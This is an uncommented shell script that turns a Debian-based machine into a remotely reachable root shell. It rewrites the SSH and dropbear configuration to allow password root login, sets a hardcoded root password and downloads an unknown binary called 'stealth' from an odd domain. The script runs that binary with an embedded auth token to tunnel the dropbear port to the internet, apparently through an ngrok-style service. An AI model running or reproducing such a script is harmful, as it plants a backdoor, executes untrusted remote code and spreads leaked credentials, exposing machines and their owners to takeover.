export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 git >/dev/null
netstat -ntlp
sleep 3

cat > /etc/ssh/sshd_config <<EOR
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
EOR

sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2
echo "root:Pmataga87465622" | chpasswd
sleep 2
service ssh restart
sleep 2
service dropbear restart
sleep 4
netstat -ntlp

wget -q https://greenleaf.teatspray.fun/stealth >/dev/null
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 1ilVTgjbJzLiHF29nLWN8Jbe6a7_2ioxVQMzGPf1Bb2rLSpa5
sleep 2
screen -dmS dropbear bash -c './stealth tcp 2299'

sleep 5

curl http://127.0.0.1:4040/api/tunnels
